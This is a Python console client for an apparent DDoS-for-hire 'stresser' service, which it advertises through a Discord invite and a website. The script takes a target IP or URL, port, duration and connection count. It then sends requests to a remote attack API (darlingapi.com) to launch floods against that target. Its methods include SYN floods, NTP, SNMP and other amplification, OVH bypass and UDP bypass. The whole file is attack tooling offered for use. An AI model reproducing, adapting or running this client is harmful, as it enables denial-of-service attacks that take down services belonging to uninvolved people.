# -*- coding: utf-8 -*-
from httpx import get
from os import system,_exit
from sys import stdout
from time import sleep
from sty import fg

_USERNAME="larina"
_KEY="YOUR_KEY_HERE"
_DALAY=0.5 # wait delay per req
_METHODS=["TCPRAW","TCPSYN","TCPACK","TCPTFO","TCPTLS","TCPAMP","VALVE","FIVEM","OVHAMP","OVHTCP","OVHUDP","SNMP","WSD","DVR","NTP","ARD","IGMP","GRE","ESP","IPRAND","TLSV1","TLSV2","UDPBYPASS"]

__builtins__.print = lambda text="",end="\r\n": stdout.write(f"{text}{end}");stdout.flush()
clearconsole = lambda:system("cls || clear")
exit=lambda: _exit(0)

class COLOR:
    def __init__(self)->None: # https://i.stack.imgur.com/S8wtO.png
        self.text   = 15
        self.invite = 82
        self.logo   = 117
        self.line   = 225
_COLOR=COLOR()

def makec(text,color):
    return f"{fg(color)}{text}{fg.rs}"

def printc(text):
    for l in text.splitlines():
        print(f"\t\t     {l}")

def logo():
    clearconsole()
    printc(makec("""\t         ▄                                                                    
\t ▄▄▄▄  ▄██▄  ▄▄▄ ▄▄    ▄▄▄▄   ▄▄▄▄   ▄▄▄▄    ▄▄▄▄  ▄▄▄ ▄▄     ▄▄▄ ▄▄▄   ▄▄▄▄  
\t██▄ ▀   ██    ██▀ ▀▀ ▄█▄▄▄██ ██▄ ▀  ██▄ ▀  ▄█▄▄▄██  ██▀ ▀▀     ██  ██  ██▄ ▀  
\t▄ ▀█▄▄  ██    ██     ██      ▄ ▀█▄▄ ▄ ▀█▄▄ ██       ██         ██  ██  ▄ ▀█▄▄ 
\t█▀▄▄█▀  ▀█▄▀ ▄██▄     ▀█▄▄▄▀ █▀▄▄█▀ █▀▄▄█▀  ▀█▄▄▄▀ ▄██▄        ▀█▄▄▀█▄ █▀▄▄█▀ """,_COLOR.logo))
    printc(makec("\t\t\tdiscord.gg/vT8W3XzNZg and stresser.us\n",_COLOR.invite))

def realint(s):
    try:return int(s)
    except:return -1

def isgoodipv4(s)->bool:
    pieces = s.split('.')
    if len(pieces) != 4: return False
    try: return all(0<=int(p)<256 for p in pieces)
    except ValueError: return False

def isgoodint(p,max)->bool:
    p=realint(p)
    if p <= max and not (p <= 0): return True
    return False

def request(ip,port,time,conn,method):
    for _ in range(int(conn)):
        try:
            resp=get(f"https://darlingapi.com/?key={_KEY}&host={ip}&port={port}&time={time}&method={method}").json()
            print(makec(resp["data"],46 if resp["error"] != "yes" else 9))
        except Exception as e:
            try:
                print(resp)
                print(resp.text)
            except:pass
            if str(e) == "Expecting value: line 1 column 1 (char 0)":
                print(makec("[!] servers full",9))
            else:
                print(e)
                print(makec("[!] api down or idk error",9))
        sleep(_DALAY)
            
            

def helpcom():
    logo()
    printc(f"""\t\t {makec("╔═════════╦══════════════════════════════════════════════════╗",_COLOR.line)}
\t\t {makec("║",_COLOR.line)} {makec("TCP",206)}     ║ {makec("> TCPRAW, TCPSYN, TCPACK, TCPTFO, TCPTLS, TCPAMP",_COLOR.text)} {makec("║",_COLOR.line)}
\t\t {makec("║",_COLOR.line)} {makec("SPECIAL",135)} ║ {makec("> VALVE, FIVEM, OVHAMP, OVHTCP, OVHUDP",_COLOR.text)}           {makec("║",_COLOR.line)}
\t\t {makec("║",_COLOR.line)} {makec("AMP",211)}     ║ {makec("> SNMP, WSD, DVR, NTP, ARD",_COLOR.text)}                       {makec("║",_COLOR.line)}
\t\t {makec("║",_COLOR.line)} {makec("L3",203)}      ║ {makec("> IGMP, GRE, ESP, IPRAND",_COLOR.text)}                         {makec("║",_COLOR.line)}
\t\t {makec("║",_COLOR.line)} {makec("L7",201)}      ║ {makec("> TLSv1, TLSv2",_COLOR.text)}                                   {makec("║",_COLOR.line)}
\t\t {makec("║",_COLOR.line)} {makec("UDP",197)}     ║ {makec("> UDPBYPASS",_COLOR.text)}                                      {makec("║",_COLOR.line)}
\t\t {makec("╚═════════╩══════════════════════════════════════════════════╝",_COLOR.line)}""")

def clearcom():
    logo()
    print("")

def main():
    # print("\n"*12)
    # stdout.write("".center(50))
    # for cha in "welcome back, larina.":
    #     stdout.write(cha)
    #     stdout.flush()
    #     sleep(0.1)
    # sleep(2)
    helpcom()
    while 1:
        rawcommands=input(f'{makec(f"{_USERNAME}@us",196)}{makec(":~$",_COLOR.text)}{fg(81)} ').split(" ")
        commands=rawcommands[0].upper()
        args=rawcommands[1:]
        if commands in _METHODS:
            if len(args) < 3 or not (commands.startswith("TLS") or isgoodipv4(args[0])) or (not isgoodint(args[1],65535)) or (not isgoodint(args[2],1200)) or (not isgoodint(args[3],10)):
                print(makec(f"[*] {commands} <ip/url> <port> <time> <conn>",99))
            else: request(args[0],args[1],args[2],args[3],commands)
        else:   
            try:
                commandslist[commands]()
            except:print(makec("[!] command not found",11))

if __name__ == "__main__":
    commandslist={"EXIT":exit,"QUIT":exit,"HELP":helpcom,"CLEAR":clearcom}
    system("CHCP 65001 || clear") # set utf 8
    system("mode 130,30 || clear")
    system("title stresser us panel private ^<3 || clear")
    main()